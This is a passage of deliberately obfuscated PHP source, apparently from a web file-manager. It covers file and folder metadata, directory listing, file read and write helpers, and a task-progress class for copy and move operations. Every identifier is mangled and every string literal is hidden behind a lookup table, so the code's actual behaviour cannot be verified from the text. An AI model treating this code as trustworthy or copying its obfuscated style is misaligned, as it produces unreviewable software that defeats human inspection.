$_SERVER[å¸¿•¶£]; $ããÉù€é = rtrim($ããÉù€é, $‚şíÏ®·[8]) . $‚şíÏ®·[8]; $ªŒ„±ôÜ = $this->iconvApp($this->pathThis($ããÉù€é)); if ($Ì™í‰ş€) { return array($‚şíÏ®·[32] => $ªŒ„±ôÜ, $‚şíÏ®·[84] => $this->getPathOuter($ããÉù€é), $‚şíÏ®·[33] => $‚şíÏ®·[75]); } $Œî´Å¹ = array($‚şíÏ®·[32] => $ªŒ„±ôÜ, $‚şíÏ®·[84] => $this->getPathOuter($ããÉù€é), $‚şíÏ®·[33] => $‚şíÏ®·[75], $‚şíÏ®·[201] => @filectime($ããÉù€é), $‚şíÏ®·[85] => @filemtime($ããÉù€é), $‚şíÏ®·[1396] => @fileatime($ããÉù€é), $‚şíÏ®·[1397] => is_readable($ããÉù€é), $‚şíÏ®·[1398] => is_writable($ããÉù€é), $‚şíÏ®·[1399] => get_mode($ããÉù€é)); return $Œî´Å¹; } private function fileInfo($ç£‡»ç¬, $ŠˆºÙÏ¤ = false) { $±”ñëí =& $_SERVER[å¸¿•¶£]; $·ù¨˜æ = $this->iconvApp($this->pathThis($ç£‡»ç¬)); if ($ŠˆºÙÏ¤) { return array($±”ñëí[32] => $·ù¨˜æ, $±”ñëí[84] => $this->getPathOuter($ç£‡»ç¬), $±”ñëí[33] => $±”ñëí[200], $±”ñëí[76] => $this->size($ç£‡»ç¬), $±”ñëí[174] => $this->ext($·ù¨˜æ)); } $˜¬üÅÚú = array($±”ñëí[32] => $·ù¨˜æ, $±”ñëí[84] => $this->getPathOuter($ç£‡»ç¬), $±”ñëí[33] => $±”ñëí[200], $±”ñëí[201] => @filectime($ç£‡»ç¬), $±”ñëí[85] => @filemtime($ç£‡»ç¬), $±”ñëí[1396] => @fileatime($ç£‡»ç¬), $±”ñëí[76] => $this->size($ç£‡»ç¬), $±”ñëí[174] => $this->ext($·ù¨˜æ), $±”ñëí[1397] => is_readable($ç£‡»ç¬), $±”ñëí[1398] => is_writable($ç£‡»ç¬), $±”ñëí[1399] => get_mode($ç£‡»ç¬)); return $˜¬üÅÚú; } public function exist($µ˜Åúå) { $µ˜Åúå = $this->iconvSystem($µ˜Åúå); return @file_exists($µ˜Åúå); } public function isFile($®ÚåÛ) { $®ÚåÛ = $this->iconvSystem($®ÚåÛ); return @is_file($®ÚåÛ); } public function isFolder($İ€õŠ®¨) { $İ€õŠ®¨ = $this->iconvSystem($İ€õŠ®¨); return @is_dir($İ€õŠ®¨); } public function listPath($î™†ÈË‰, $¤Ì•Û„° = false) { $¶¦Ö‰ˆ³ =& $_SERVER[å¸¿•¶£]; $î™†ÈË‰ = $this->iconvSystem($î™†ÈË‰); $î™†ÈË‰ = rtrim($î™†ÈË‰, $¶¦Ö‰ˆ³[8]) . $¶¦Ö‰ˆ³[8]; $Õ½»íú = array($¶¦Ö‰ˆ³[82] => array(), $¶¦Ö‰ˆ³[83] => array()); if (!($„àšŒá = @opendir($î™†ÈË‰))) { return $Õ½»íú; } while (($©€¥½ØÎ = readdir($„àšŒá)) !== !1) { if ($©€¥½ØÎ == $¶¦Ö‰ˆ³[10] || $©€¥½ØÎ == $¶¦Ö‰ˆ³[1393]) { continue; } $•¢şÍÜ = $î™†ÈË‰ . $©€¥½ØÎ; if (is_file($•¢şÍÜ)) { $Õ½»íú[$¶¦Ö‰ˆ³[83]][] = $this->fileInfo($•¢şÍÜ, $¤Ì•Û„°); } else { $Õ½»íú[$¶¦Ö‰ˆ³[82]][] = $this->folderInfo($•¢şÍÜ, $¤Ì•Û„°); } } closedir($„àšŒá); return $Õ½»íú; } public function listAll($İ”åæì”, &$óåÔ×¼ã = array()) { $áÓâŞ›„ =& $_SERVER[å¸¿•¶£]; $İ”åæì” = $this->iconvSystem($İ”åæì”); $İ”åæì” = rtrim($İ”åæì”, $áÓâŞ›„[8]) . $áÓâŞ›„[8]; if (!($×é‘–Á‰ = @opendir($İ”åæì”))) { return $óåÔ×¼ã; } while (($ıéÔ«Ì· = readdir($×é‘–Á‰)) !== !1) { if ($ıéÔ«Ì· == $áÓâŞ›„[10] || $ıéÔ«Ì· == $áÓâŞ›„[1393]) { continue; } $òôŸŞ³° = $İ”åæì” . $ıéÔ«Ì·; $ìµÔÂÖú = is_dir($òôŸŞ³°) && !is_link($òôŸŞ³°) ? 1 : 0; $òôŸŞ³° = $ìµÔÂÖú ? $òôŸŞ³° . $áÓâŞ›„[8] : $òôŸŞ³°; $óåÔ×¼ã[] = array($áÓâŞ›„[84] => $òôŸŞ³°, $áÓâŞ›„[75] => $ìµÔÂÖú, $áÓâŞ›„[85] => intval(@filemtime($òôŸŞ³°)), $áÓâŞ›„[76] => $ìµÔÂÖú ? 0 : intval($this->size($òôŸŞ³°))); if ($ìµÔÂÖú) { $this->listAll($òôŸŞ³°, $óåÔ×¼ã); } } closedir($×é‘–Á‰); return $óåÔ×¼ã; } public function has($³Á±É–ï, $Í©³±¼¬ = false, $Ï€È¨œ‡ = true) { $ê­À×§ =& $_SERVER[å¸¿•¶£]; $³Á±É–ï = $this->iconvSystem($³Á±É–ï); $³Á±É–ï = rtrim($³Á±É–ï, $ê­À×§[8]) . $ê­À×§[8]; if (!($ÏÀ„†ó = @opendir($³Á±É–ï))) { return !1; } $¤áü„± = 0; $à¸ÒªÖ¬ = 0; $äŒŒû­è = 0; while (($Şéã™ô— = readdir($ÏÀ„†ó)) !== !1) { if ($Şéã™ô— == $ê­À×§[10] || $Şéã™ô— == $ê­À×§[1393]) { continue; } $æîì€Äì = $³Á±É–ï . $Şéã™ô—; if ($Í©³±¼¬) { $äŒŒû­è++; if (@is_file($æîì€Äì)) { $¤áü„±++; } else { $à¸ÒªÖ¬++; } if ($äŒŒû­è > 10000) { break; } continue; } if ($Ï€È¨œ‡) { if (@is_file($æîì€Äì)) { return !0; } } else { if (@is_dir($æîì€Äì . $ê­À×§[8])) { return !0; } } } closedir($ÏÀ„†ó); if ($Í©³±¼¬) { return array($ê­À×§[207] => $¤áü„±, $ê­À×§[208] => $à¸ÒªÖ¬); } return !1; } public function hashSimple($ôêÌ¡ë“) { $üîÖ²Õö =& $_SERVER[å¸¿•¶£]; if (!$ôêÌ¡ë“) { return md5($üîÖ²Õö[12]); } $ôêÌ¡ë“ = $this->iconvSystem($ôêÌ¡ë“); $† ÚˆÃ = $this->size($ôêÌ¡ë“); $üçâŠäë = 200; $èÛ†êŠ = 50; if ($† ÚˆÃ <= $üçâŠäë * $èÛ†êŠ) { return $this->hashMd5($ôêÌ¡ë“) . $† ÚˆÃ; } $ÅÇó¶ŒÅ = $üîÖ²Õö[12]; $¢µÈÈÓ© = intval($† ÚˆÃ / $èÛ†êŠ); $áê¢ßßç = fopen($ôêÌ¡ë“, $üîÖ²Õö[1400]); if (!$áê¢ßßç) { return $ÅÇó¶ŒÅ; } for ($şùÕá«â = 0; $şùÕá«â < $èÛ†êŠ; $şùÕá«â++) { fseek_64($áê¢ßßç, $¢µÈÈÓ© * $şùÕá«â); $ÅÇó¶ŒÅ .= fread($áê¢ßßç, $üçâŠäë); } fseek_64($áê¢ßßç, $† ÚˆÃ - $üçâŠäë); $ÅÇó¶ŒÅ .= fread($áê¢ßßç, $üçâŠäë); fclose($áê¢ßßç); return md5($ÅÇó¶ŒÅ) . $† ÚˆÃ; } public function getContent($¶’àİ‡²) { $¶’àİ‡² = $this->iconvSystem($¶’àİ‡²); return file_get_contents($¶’àİ‡²); } public function setContent($…¯İ›ª£, $¾ıÇ¸Æ = '') { $…¯İ›ª£ = $this->iconvSystem($…¯İ›ª£); $¨–îØœø = @file_put_contents($…¯İ›ª£, $¾ıÇ¸Æ, LOCK_EX); clearstatcache(); @chmod($…¯İ›ª£, $this->pathAuth); return $¨–îØœø === !1 ? !1 : !0; } public function fileSubstr($Ğß·›¨¬, $ú¹®ğ‚Ò = 0, $õíığµ™ = false) { $¶¶¯˜Ã =& $_SERVER[å¸¿•¶£]; $Ğß·›¨¬ = $this->iconvSystem($Ğß·›¨¬); if ($õíığµ™ === !1) { $õíığµ™ = $this->size($Ğß·›¨¬); } if ($õíığµ™ <= 0) { return $¶¶¯˜Ã[12]; } $¬ıÇŸ¨ = fopen($Ğß·›¨¬, $¶¶¯˜Ã[1400]); if (!$¬ıÇŸ¨) { return !1; } fseek_64($¬ıÇŸ¨, $ú¹®ğ‚Ò); $¿ÌÛåâ· = fread($¬ıÇŸ¨, $õíığµ™); fclose($¬ıÇŸ¨); return $¿ÌÛåâ·; } public function upload($ˆêÏûÈ¡, $«“ş°Â™, $çé€ÎÓ© = false, $À¬üÎÜ = REPEAT_REPLACE) { if ($çé€ÎÓ©) { return $this->moveFile($«“ş°Â™, $ˆêÏûÈ¡); } return $this->copyFile($«“ş°Â™, $ˆêÏûÈ¡); } public function setModifyTime($ä¡Çíñ, $˜±¦õ”ª = '') { @touch($ä¡Çíñ, intval($˜±¦õ”ª)); } public function download($şƒ™öÕÅ, $ñ²øìŞ®) { return $this->iconvSystem($şƒ™öÕÅ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($©¿«ÔÆ) { parent::__construct($©¿«ÔÆ); $this->signatureVersion($_SERVER[å¸¿•¶£][216]); } public function fileOutLink($Î¼º™ØÜ) { $íßâ£Ñ¤ =& $_SERVER[å¸¿•¶£]; if (substr($Î¼º™ØÜ, 0, 7) == $íßâ£Ñ¤[1344]) { $Î¼º™ØÜ = $íßâ£Ñ¤[1345] . substr($Î¼º™ØÜ, 7); } header($íßâ£Ñ¤[161] . $Î¼º™ØÜ); die; } } goto eâ¡ñ“ğÓ; C¸¡ª“µßÔ: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($éÅŞ«Ø³, $ì†µ¥Ä… = '', $Ãä§ = 0, $ÃÀ‘‘·ê = '') { $É¥ÀÕô¯ =& $_SERVER[å¸¿•¶£]; if (self::get($éÅŞ«Ø³)) { return; } $this->task = array($É¥ÀÕô¯[399] => $éÅŞ«Ø³, $É¥ÀÕô¯[1674] => USER_ID, $É¥ÀÕô¯[1574] => $ÃÀ‘‘·ê, $É¥ÀÕô¯[453] => $É¥ÀÕô¯[12], $É¥ÀÕô¯[33] => $ì†µ¥Ä…, $É¥ÀÕô¯[1071] => $É¥ÀÕô¯[12], $É¥ÀÕô¯[793] => $Ãä§, $É¥ÀÕô¯[1675] => 0, $É¥ÀÕô¯[1676] => 0, $É¥ÀÕô¯[1677] => 0, $É¥ÀÕô¯[1678] => timeFloat(), $É¥ÀÕô¯[1679] => 0, $É¥ÀÕô¯[1680] => 0, $É¥ÀÕô¯[1681] => 0, $É¥ÀÕô¯[1682] => 0, $É¥ÀÕô¯[756] => $É¥ÀÕô¯[1633]); $GLOBALS[$É¥ÀÕô¯[1683]] = 1; Hook::bind($É¥ÀÕô¯[1638], array($this, $É¥ÀÕô¯[1684])); Hook::bind($É¥ÀÕô¯[1685], array($this, $É¥ÀÕô¯[1686])); $this->startAfter(); Hook::trigger($É¥ÀÕô¯[1687], $this->task); $this->task[$É¥ÀÕô¯[1680]] = timeFloat(); } public function end($‚¢‡™¤ = '') { $øú÷âäß =& $_SERVER[å¸¿•¶£]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$øú÷âäß[1680]]) { self::valueSet($this->task[$øú÷âäß[399]], !1); } $this->isEnd = !0; if ($‚¢‡™¤) { $this->task[$øú÷âäß[453]] = $‚¢‡™¤; } self::log($øú÷âäß[1688] . $this->task[$øú÷âäß[399]] . $øú÷âäß[1689] . sprintf($øú÷âäß[857], timeFloat() - $this->task[$øú÷âäß[1678]]) . $øú÷âäß[1690]); Hook::unbind($øú÷âäß[1638], array($this, $øú÷âäß[1684])); Hook::unbind($øú÷âäß[1685], array($this, $øú÷âäß[1686])); $this->endAfter(); $æğ²ë– = $this->task; $this->task = !1; Hook::trigger($øú÷âäß[1691], $æğ²ë–); } public function update($Ğ¡ÉÀª¿ = 0, $õšôß˜ = false) { $çøÍ ş =& $_SERVER[å¸¿•¶£]; $©ÖØì„Í =& $this->task; if (!$©ÖØì„Í) { return; } $©ÖØì„Í[$çøÍ ş[1675]] += $Ğ¡ÉÀª¿; $©ÖØì„Í[$çøÍ ş[1679]] = timeFloat(); if ($©ÖØì„Í[$çøÍ ş[793]]) { if ($©ÖØì„Í[$çøÍ ş[793]] < $©ÖØì„Í[$çøÍ ş[1675]]) { $©ÖØì„Í[$çøÍ ş[793]] = $©ÖØì„Í[$çøÍ ş[1675]]; } $Î‘æÉ¥» = timeFloat() - $©ÖØì„Í[$çøÍ ş[1678]] - $©ÖØì„Í[$çøÍ ş[1681]]; if ($Î‘æÉ¥» <= 0) { $Î‘æÉ¥» = 0.001; } $©ÖØì„Í[$çøÍ ş[1676]] = $©ÖØì„Í[$çøÍ ş[1675]] / $©ÖØì„Í[$çøÍ ş[793]]; $©ÖØì„Í[$çøÍ ş[1677]] = $©ÖØì„Í[$çøÍ ş[1675]] / $Î‘æÉ¥»; if ($©ÖØì„Í[$çøÍ ş[1676]] > 0) { $©ÖØì„Í[$çøÍ ş[1682]] = $Î‘æÉ¥» * (1 - $©ÖØì„Í[$çøÍ ş[1676]]) / $©ÖØì„Í[$çøÍ ş[1676]]; } $©ÖØì„Í[$çøÍ ş[1682]] = $©ÖØì„Í[$çøÍ ş[1682]] <= 0 ? 0 : $©ÖØì„Í[$çøÍ ş[1682]]; } $this->updateAfter(); $ê¶ÛŸÖ© = 0.2; if (timeFloat() - $©ÖØì„Í[$çøÍ ş[1680]] < $ê¶ÛŸÖ© && !$õšôß˜) { return; } $©«è±Î = self::get($©ÖØì„Í[$çøÍ ş[399]]); $Ù×Ìò¹› = $©«è±Î[$çøÍ ş[756]]; if ($Ù×Ìò¹› == self::STATYS_KILL) { $ ßÇ˜éª = array($çøÍ ş[1692] => LNG($çøÍ ş[1693]), $çøÍ ş[1219] => !1); Cache::set($çøÍ ş[1694] . $this->task[$çøÍ ş[399]], $ ßÇ˜éª, 30); $this->onKill(); $this->end(); die; } else { if ($Ù×Ìò¹› == self::STATYS_STOP) { $ÛŒû‹Çò = 2; $©«è±Î[$çøÍ ş[1681]] += $ÛŒû‹Çò; self::valueSet($©ÖØì„Í[$çøÍ ş[399]], $©«è±Î); sleep($ÛŒû‹Çò); $this->update(); return; } } $©ÖØì„Í[$çøÍ ş[756]] = $Ù×Ìò¹› ? $Ù×Ìò¹› : $©ÖØì„Í[$çøÍ ş[756]]; $©ÖØì„Í[$çøÍ ş[1681]] = $©«è±Î[$çøÍ ş[1681]] ? $©«è±Î[$çøÍ ş[1681]] : 0; $©ÖØì„Í[$çøÍ ş[1680]] = timeFloat(); Hook::trigger($çøÍ ş[1695], $©ÖØì„Í); self::valueSet($©ÖØì„Í[$çøÍ ş[399]], $©ÖØì„Í); } public function onKillSet($à¯ÄŞšñ, $­ÆºÊù… = array()) { $this->onKillCall = array($à¯ÄŞšñ, $­ÆºÊù…); } public function onKill() { $ê×ùıÎ =& $_SERVER[å¸¿•¶£]; self::log($ê×ùıÎ[1688] . $this->task[$ê×ùıÎ[399]] . $ê×ùıÎ[1696]); Hook::trigger($ê×ùıÎ[1697], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Áâ±ç§Ø) { $•Úç“ÌŒ =& $_SERVER[å¸¿•¶£]; Cache::set($•Úç“ÌŒ[1694] . $this->task[$•Úç“ÌŒ[399]], $Áâ±ç§Ø, 60); return $Áâ±ç§Ø; } public static function get($ğğ§À´î) { $µ±È½ı =& $_SERVER[å¸¿•¶£]; $ÁËê‡ = self::valueGet($ğğ§À´î); if (is_array($ÁËê‡) && $ÁËê‡[$µ±È½ı[1698]]) { $Ÿ”şÍì¾ = ActionApply($ÁËê‡[$µ±È½ı[1698]], array($ÁËê‡)); $ÁËê‡ = is_array($Ÿ”şÍì¾) ? $Ÿ”şÍì¾ : $ÁËê‡; } return $ÁËê‡; } public static function listData() { $ªğŸİœå = self::valueGet(); return array_sort_by($ªğŸİœå, $_SERVER[å¸¿•¶£][1678], !0); } public static function kill($“ËÇÁîŠ) { return self::changeStatus($“ËÇÁîŠ, self::STATYS_KILL); } public static function stop($Óìê¯ê) { return self::changeStatus($Óìê¯ê, self::STATYS_STOP); } public static function restart($íŠ„óüÀ) { return self::changeStatus($íŠ„óüÀ, self::STATYS_RUNNING); } public static function killAll() { $Ó–Ğñë¶ =& $_SERVER[å¸¿•¶£]; $¼È·ì¸÷ = self::listData(); foreach ($¼È·ì¸÷ as $ÊÙ´Çñá) { self::kill($ÊÙ´Çñá[$Ó–Ğñë¶[399]]); } sleep(2); foreach ($¼È·ì¸÷ as $ÊÙ´Çñá) { self::valueSet($ÊÙ´Çñá[$Ó–Ğñë¶[399]], !1); } } private static function changeStatus($ç½Ç×ÚÔ, $¿éå×Á) { $£Áî±ñ— =& $_SERVER[å¸¿•¶£]; $Ì—ŒûÃ = self::valueGet($ç½Ç×ÚÔ); if (!$Ì—ŒûÃ) { return !1; } $Ì—ŒûÃ[$£Áî±ñ—[756]] = $¿éå×Á; self::valueSet($ç½Ç×ÚÔ, $Ì—ŒûÃ); self::log($£Áî±ñ—[1699] . $Ì—ŒûÃ[$£Áî±ñ—[399]] . $£Áî±ñ—[1700] . $¿éå×Á); return !0; } public static function valueGet($Øç˜Àç³ = false) { $ù‰‹ÔÂ¨ =& $_SERVER[å¸¿•¶£]; if ($Øç˜Àç³) { $½Å©Æ©æ = Model($ù‰‹ÔÂ¨[447])->where(array($ù‰‹ÔÂ¨[94] => $Øç˜Àç³, $ù‰‹ÔÂ¨[33] => $ù‰‹ÔÂ¨[1078]))->find(); return $½Å©Æ©æ ? json_decode($½Å©Æ©æ[$ù‰‹ÔÂ¨[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ˆúæôº¿ = false) { $€ˆ¦¥‡é =& $_SERVER[å¸¿•¶£]; $ˆ÷µ©Ü— = array($€ˆ¦¥‡é[33] => $€ˆ¦¥‡é[1078]); if ($ˆúæôº¿) { $ˆ÷µ©Ü—[$€ˆ¦¥‡é[1674]] = $ˆúæôº¿; } $•åÑß = Model($€ˆ¦¥‡é[447])->where($ˆ÷µ©Ü—)->select(); $•åÑß = $•åÑß ? $•åÑß : array(); foreach ($•åÑß as $¹×û’Ó£ => $¢ğ¾ğí) { $•åÑß[$¹×û’Ó£] = json_decode($¢ğ¾ğí[$€ˆ¦¥‡é[374]], !0); } return $•åÑß; } public static function valueSet($÷ù¹ıÈÇ, $¥¸éÈó´) { $“¦³ÑÂÀ =& $_SERVER[å¸¿•¶£]; if (!$¥¸éÈó´) { return Model($“¦³ÑÂÀ[447])->where(array($“¦³ÑÂÀ[94] => $÷ù¹ıÈÇ, $“¦³ÑÂÀ[33] => $“¦³ÑÂÀ[1078]))->delete(); } $éÏ´Âôú = json_encode($¥¸éÈó´); if (!$éÏ´Âôú) { ob_start(); var_dump($¥¸éÈó´); $Ê¾®»Ã½ = ob_get_clean(); self::log($“¦³ÑÂÀ[1701] . json_encode_force($Ê¾®»Ã½)); } if (!$÷ù¹ıÈÇ || !$¥¸éÈó´[$“¦³ÑÂÀ[399]]) { return !1; } $ƒ¯Ò±û• = array($“¦³ÑÂÀ[33] => $“¦³ÑÂÀ[1078], $“¦³ÑÂÀ[1674] => USER_ID, $“¦³ÑÂÀ[94] => $÷ù¹ıÈÇ, $“¦³ÑÂÀ[374] => $éÏ´Âôú); $çşÈÒ°‚ = $“¦³ÑÂÀ[1702]; CacheLock::lock($çşÈÒ°‚); Model($“¦³ÑÂÀ[447])->add($ƒ¯Ò±û•, array(), !0); CacheLock::unlock($çşÈÒ°‚); } public static function log($…ØŠÂ½Ñ) { if (!GLOBAL_DEBUG) { return; } write_log($…ØŠÂ½Ñ, $_SERVER[å¸¿•¶£][1703]); } } class TaskFileTransfer extends Task { protected function startAfter() { $â½©²» =& $_SERVER[å¸¿•¶£]; $õÔ¼¸±® =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($â½©²»[1704], array($this, $â½©²»[1705])); Hook::bind($â½©²»[1230], array($this, $â½©²»[1706])); Hook::bind($â½©²»[1707], array($this, $â½©²»[1708])); Hook::bind($â½©²»[596], array($this, $â½©²»[1709])); Hook::bind($â½©²»[597], array($this, $â½©²»[1710])); Hook::bind($â½©²»[602], array($this, $â½©²»[1711])); Hook::bind($â½©²»[603], array($this, $â½©²»[1712])); Hook::bind($â½©²»[599], array($this, $â½©²»[1713])); Hook::bind($â½©²»[600], array($this, $â½©²»[1714])); Hook::bind($â½©²»[565], array($this, $â½©²»[1715])); Hook::bind($â½©²»[562], array($this, $â½©²»[1715])); Hook::bind($â½©²»[567], array($this, $â½©²»[1715])); Hook::bind($â½©²»[569], array($this, $â½©²»[1715])); Hook::bind($â½©²»[571], array($this, $â½©²»[1715])); Hook::bind($â½©²»[1716], array($this, $â½©²»[1717])); Hook::bind($â½©²»[587], array($this, $â½©²»[1718])); $this->sourceModelCopyFlag = !1; Hook::bind($â½©²»[1719], array($this, $â½©²»[1720])); Hook::bind($â½©²»[1721], array($this, $â½©²»[1722])); Hook::bind($â½©²»[1723], array($this, $â½©²»[1724])); $õÔ¼¸±®[$â½©²»[1725]] = LNG($â½©²»[1726]); $õÔ¼¸±®[$â½©²»[1727]] = 0; $õÔ¼¸±®[$â½©²»[1728]] = 0; $õÔ¼¸±®[$â½©²»[1071]] = $â½©²»[12]; $õÔ¼¸±®[$â½©²»[1729]] = $â½©²»[12]; $õÔ¼¸±®[$â½©²»[1730]] = 0; $õÔ¼¸±®[$â½©²»[1731]] = 0; $õÔ¼¸±®[$â½©²»[1732]] = 0; if (!$õÔ¼¸±®[$â½©²»[1574]]) { $õÔ¼¸±®[$â½©²»[1574]] = LNG($â½©²»[1733]); } } protected function endAfter() { $ºûÎ–‡Ä =& $_SERVER[å¸¿•¶£]; Hook::unbind($ºûÎ–‡Ä[1704], array($this, $ºûÎ–‡Ä[1705])); Hook::unbind($ºûÎ–‡Ä[1230], array($this, $ºûÎ–‡Ä[1706])); Hook::unbind($ºûÎ–‡Ä[1707], array($this, $ºûÎ–‡Ä[1708])); Hook::unbind($ºûÎ–‡Ä[596], array($this, $ºûÎ–‡Ä[1709])); Hook::unbind($ºûÎ–‡Ä[597], array($this, $ºûÎ–‡Ä[1710])); Hook::unbind($ºûÎ–‡Ä[602], array($this, $ºûÎ–‡Ä[1711])); Hook::unbind($ºûÎ–‡Ä[603], array($this, $ºûÎ–‡Ä[1712])); Hook::unbind($ºûÎ–‡Ä[599], array($this, $ºûÎ–‡Ä[1713])); Hook::unbind($ºûÎ–‡Ä[600], array($this, $ºûÎ–‡Ä[1714])); Hook::unbind($ºûÎ–‡Ä[565], array($this, $ºûÎ–‡Ä[1715])); Hook::unbind($ºûÎ–‡Ä[562], array($this, $ºûÎ–‡Ä[1715])); Hook::unbind($ºûÎ–‡Ä[567], array($this, $ºûÎ–‡Ä[1715])); Hook::unbind($ºûÎ–‡Ä[569], array($this, $ºûÎ–‡Ä[1715])); Hook::unbind($ºûÎ–‡Ä[571], array($this, $ºûÎ–‡Ä[1715])); Hook::unbind($ºûÎ–‡Ä[1716], array($this, $ºûÎ–‡Ä[1717])); Hook::unbind($ºûÎ–‡Ä[587], array($this, $ºûÎ–‡Ä[1718])); Hook::unbind($ºûÎ–‡Ä[1719], array($this, $ºûÎ–‡Ä[1720])); Hook::unbind($ºûÎ–‡Ä[1721], array($this, $ºûÎ–‡Ä[1722])); Hook::unbind($ºûÎ–‡Ä[1723], array($this, $ºûÎ–‡Ä[1724])); } public function copyMoveStart($µÈ¿’Åú, $Ëîœ÷°İ, $´‰Ø‘ƒ, $¨ıù‹ÎŸ) { $¬Âıˆû =& $_SERVER[å¸¿•¶£]; self::log($¬Âıˆû[1734] . $Ëîœ÷°İ . $¬Âıˆû[70] . $¨ıù‹ÎŸ); $ƒ‘‘÷°‡ = rtrim(TEMP_FILES, $¬Âıˆû[8]); if (substr($Ëîœ÷°İ, 0, strlen($ƒ‘‘÷°‡)) == $ƒ‘‘÷°‡) { return; } if (substr($¨ıù‹ÎŸ, 0, strlen($ƒ‘‘÷°‡)) == $ƒ‘‘÷°‡) { return; } $±‰ÊÒ•‚ =& $this->task; $±‰ÊÒ•‚[$¬Âıˆû[1735]] = KodIO::transferType($µÈ¿’Åú, $´‰Ø‘ƒ); $this->update(); } public function updateAfter() { $Úû¡ÒìÑ =& $_SERVER[å¸¿•¶£]; $†Ä»ˆÕß =& $this->task; if (!$†Ä»ˆÕß[$Úû¡ÒìÑ[770]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($†Ä»ˆÕß[$Úû¡ÒìÑ[1735]] == $Úû¡ÒìÑ[1319]) { return; } self::updateTask($†Ä»ˆÕß); } private static function updateTask(&$êÄ†£ÙË) { $ñÏìœ–à =& $_SERVER[å¸¿•¶£]; if ($êÄ†£ÙË[$ñÏìœ–à[1735]] == $ñÏìœ–à[1201] || $êÄ†£ÙË[$ñÏìœ–à[1735]] == $ñÏìœ–à[107]) { if ($êÄ†£ÙË[$ñÏìœ–à[1729]]) { $êÄ†£ÙË[$ñÏìœ–à[1732]] = $êÄ†£ÙË[$ñÏìœ–à[1731]] + $êÄ†£ÙË[$ñÏìœ–à[1728]]; } } else { if ($êÄ†£ÙË[$ñÏìœ–à[1735]] == $ñÏìœ–à[1320]) { if ($êÄ†£ÙË[$ñÏìœ–à[1729]] == $ñÏìœ–à[1201]) { $êÄ†£ÙË[$ñÏìœ–à[1732]] = $êÄ†£ÙË[$ñÏìœ–à[1731]] + $êÄ†£ÙË[$ñÏìœ–à[1728]] * 0.5; } else { if ($êÄ†£ÙË[$ñÏìœ–à[1729]] == $ñÏìœ–à[107]) { $êÄ†£ÙË[$ñÏìœ–à[1732]] = $êÄ†£ÙË[$ñÏìœ–à[1731]] + $êÄ†£ÙË[$ñÏìœ–à[1727]] * 0.5 + $êÄ†£ÙË[$ñÏìœ–à[1728]] * 0.5; } } } } $êÄ†£ÙË[$ñÏìœ–à[1676]] = $êÄ†£ÙË[$ñÏìœ–à[1732]] / $êÄ†£ÙË[$ñÏìœ–à[770]]; if ($êÄ†£ÙË[$ñÏìœ–à[1676]] > 0) { $Ğõ©üû = timeFloat() - $êÄ†£ÙË[$ñÏìœ–à[1678]] - $êÄ†£ÙË[$ñÏìœ–à[1681]]; $êÄ†£ÙË[$ñÏìœ–à[1682]] = $Ğõ©üû * (1 - $êÄ†£ÙË[$ñÏìœ–à[1676]]) / $êÄ†£ÙË[$ñÏìœ–à[1676]]; } } public function addPath($¤å•çÓ) { $é‘¬›¦ =& $_SERVER[å¸¿•¶£]; if (!$¤å•çÓ) { return; } $Éï¢•¹ş =& $this->task; $Ùë…Ì£ = IO::infoWithChildren($¤å•çÓ); $ø–§Ş€¯ = $Éï¢•¹ş[$é‘¬›¦[1736]] ? $Éï¢•¹ş[$é‘¬›¦[1736]][$é‘¬›¦[1737]] : 0; $Éï¢•¹ş[$é‘¬›¦[1736]] = array($é‘¬›¦[1737] => $ø–§Ş€¯ + 1, $é‘¬›¦[420] => $Ùë…Ì£[$é‘¬›¦[32]], $é‘¬›¦[84] => $Ùë…Ì£[$é‘¬›¦[84]], $é‘¬›¦[509] => $Ùë…Ì£[$é‘¬›¦[509]] ? $Ùë…Ì£[$é‘¬›¦[509]] : $Ùë…Ì£[$é‘¬›¦[84]]); if ($Ùë…Ì£[$é‘¬›¦[33]] == $é‘¬›¦[200]) { $Éï¢•¹ş[$é‘¬›¦[793]] += 1; } else { $Éï¢•¹ş[$é‘¬›¦[793]] += $Ùë…Ì£[$é‘¬›¦[79]][$é‘¬›¦[77]]; if ($Ùë…Ì£[$é‘¬›¦[402]]) { $Éï¢•¹ş[$é‘¬›¦[793]] += $Ùë…Ì£[$é‘¬›¦[79]][$é‘¬›¦[78]] + 1; } } $Éï¢•¹ş[$é‘¬›¦[770]] += $Ùë…Ì£[$é‘¬›¦[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÏÔèà¼) { } public function sourceAddHashEnd($¿İ ò×) { } public function sourceAddFileStart($¾ë¯µá) { $–¾÷…™ =& $_SERVER[å¸¿•¶£]; $©æ¦ßî =& $this->task; $©æ¦ßî[$–¾÷…™[1727]] = $¾ë¯µá[$–¾÷…™[76]]; $©æ¦ßî[$–¾÷…™[1725]] = $¾ë¯µá[$–¾÷…™[32]]; $©æ¦ßî[$–¾÷…™[1071]] = $¾ë¯µá[$–¾÷…™[32]]; $©æ¦ßî[$–¾÷…™[1738]] = $¾ë¯µá[$–¾÷…™[84]]; $this->update(); } public function sourceAddFileEnd($ÀÆû¾Ù¸) { $‡ë°Åší =& $_SERVER[å¸¿•¶£]; $²—‚ÒÙ =& $this->task; $²—‚ÒÙ[$‡ë°Åší[1732]] += $ÀÆû¾Ù¸[$‡ë°Åší[76]]; $²—‚ÒÙ[$‡ë°Åší[1738]] = $ÀÆû¾Ù¸[$‡ë°Åší[84]]; $this->update(1); } public function copyFileStart($«¸Ï¢’ø, $„è²ŠÌ, $Ïßëş, $ŸÁ“îï, $¾ŞÜ…Ê†, $İàû) { $Ûê¾¹¹ =& $_SERVER[å¸¿•¶£]; $ü¦Ê¢ñŠ = $¾ŞÜ…Ê†; if ($ü¦Ê¢ñŠ == 